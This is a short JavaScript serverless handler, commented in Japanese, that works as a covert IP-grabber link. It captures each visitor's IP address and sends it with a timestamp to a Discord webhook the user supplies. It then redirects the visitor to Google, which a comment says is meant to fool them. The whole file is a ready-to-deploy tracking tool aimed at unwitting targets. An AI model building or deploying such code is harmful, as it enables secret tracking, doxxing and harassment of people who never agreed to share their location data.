export default async function handler(req, res) {
    // 相手のIPを取得
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    // Discord WebhookのURL（ここに自分のを貼る）
    const webhookUrl = 'ここに自分のWebhookURLを貼る';

    // Discordに送信する内容
    const payload = {
        content: `🚨 **アクセス通知**\nIPアドレス: \`${ip}\` \n時刻: ${new Date().toLocaleString('ja-JP')}`
    };

    // Discordへ送信
    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });
    } catch (e) {
        console.error(e);
    }

    // 相手をGoogleに飛ばしてごまかす
    res.redirect(302, 'https://www.google.com');
}
